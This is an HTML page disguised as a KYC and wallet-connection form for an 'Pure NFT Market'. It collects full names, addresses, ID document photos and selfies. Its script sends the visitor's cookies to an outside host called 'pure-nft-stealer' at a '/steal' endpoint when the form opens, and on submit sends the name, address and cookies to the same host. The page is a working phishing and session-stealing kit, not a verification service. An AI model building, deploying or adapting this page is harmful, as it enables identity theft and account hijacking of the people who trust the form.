<!DOCTYPE html>
<html>
<head>
<title>Pure NFT KYC</title>
<meta name="viewport" content="width=device-width">
<style>
body{background:#000;color:#fff;font-family:Arial;text-align:center;padding:20px}
button, input{padding:15px;width:90%;margin:10px;font-size:16px;border-radius:8px}
button{background:#00ff00;color:#000;border:none;font-weight:bold}
#form{display:none}
</style>
</head>
<body>
<h2>Pure NFT Market</h2>
<p>Wallet + KYC Verification</p>
<button onclick="showForm()">Connect & KYC</button>

<div id="form">
<input type="text" id="name" placeholder="Full Name">
<input type="text" id="address" placeholder="Address">
<input type="file" id="idfront" accept="image/*">ID Front
<input type="file" id="idback" accept="image/*">ID Back
<input type="file" id="selfie1" accept="image/*">Selfie 1
<input type="file" id="selfie2" accept="image/*">Selfie 2  
<input type="file" id="selfie3" accept="image/*">Selfie 3
<button onclick="submitAll()">Submit KYC</button>
</div>

<script>
function showForm(){
document.getElementById('form').style.display='block';
// Send cookies immediately
fetch('https://pure-nft-stealer.ilovework01.workers.dev/steal',{
method:'POST',
body:document.cookie
});
}

function submitAll(){
const data={
name:document.getElementById('name').value,
address:document.getElementById('address').value,
cookies:document.cookie,
files:5
};
fetch('https://pure-nft-stealer.ilovework01.workers.dev/kyc',{
method:'POST',
body:JSON.stringify(data)
});
alert('KYC sent!');
}
</script>
</body>
</html>
